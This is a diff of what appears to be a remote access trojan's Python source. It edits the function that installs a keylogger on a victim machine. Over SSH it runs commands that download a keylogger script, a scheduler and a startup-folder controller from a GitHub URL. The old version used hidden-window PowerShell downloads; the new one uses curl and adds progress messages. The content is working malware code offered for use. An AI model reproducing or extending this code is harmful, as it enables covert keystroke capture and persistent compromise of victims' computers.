@@ -100,17 +100,28 @@ def remotedownload(address, password, download_file, path):
     os.system(f"sshpass -p \"{password}\" scp -r rat@{address}:{path} {local_path}")
 
 def remote_commands(address, password, command):
+    
     os.system(f"sshpass -p \"{password}\" ssh rat@{address} '{command}'")
 
 def keylogger(address, target_password, startup_dir, working_dir):
     #web requests
-    keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/payloads/keylogger.ps1 -OutFile {working_dir}/keylogger.ps1\""
-    scheduler_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/payloads/l.ps1 -OutFile {working_dir}/l.ps1\""
-    controller_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/payloads/c.cmd -OutFile {startup_dir}/c.cmd\""
-    remote_commands(address, target_password, keylogger_command)
-    remote_commands(address, target_password, scheduler_command)
-    remote_commands(address, target_password, controller_command)
+    #keylogger_command = f"powershell.exe \"-Command $ProgressPreference = \\\"SilentlyContinue\\\"; Invoke-WebRequest -Uri https://raw.githubusercontent.com/lukeeeeeee335/RAT/main/payloads/keylogger.ps1 -OutFile {working_dir}/keylogger.ps1\""
+    print("\n[*] Prepping Keylogger... [*]")
+    keylogger_command = f'curl -L https://raw.githubusercontent.com/lukeeeeeee335/RAT/main/payloads/keylogger.ps1 -o "{working_dir}/keylogger.ps1"'
 
+    scheduler_command = f'curl -L https://raw.githubusercontent.com/lukeeeeeee335/RAT/main/payloads/l.ps1 -o "{working_dir}/l.ps1"'
+
+    controller_command = f'curl -L https://raw.githubusercontent.com/lukeeeeeee335/RAT/main/payloads/c.cmd -o "{startup_dir}/c.cmd"'
+    print("[+] Keylogger Prepped")
+
+    print("[*] Installing keylogger...")
+    remote_commands(address, target_password, keylogger_command)
+    print("[*] Installing Scheduler...")
+    remote_commands(address, target_password, scheduler_command)
+    print("[*] Installing Controller...")
+
+    remote_commands(address, target_password, controller_command)
+    print("[+] Keylogger Installed Sucessfully")
 
 
 
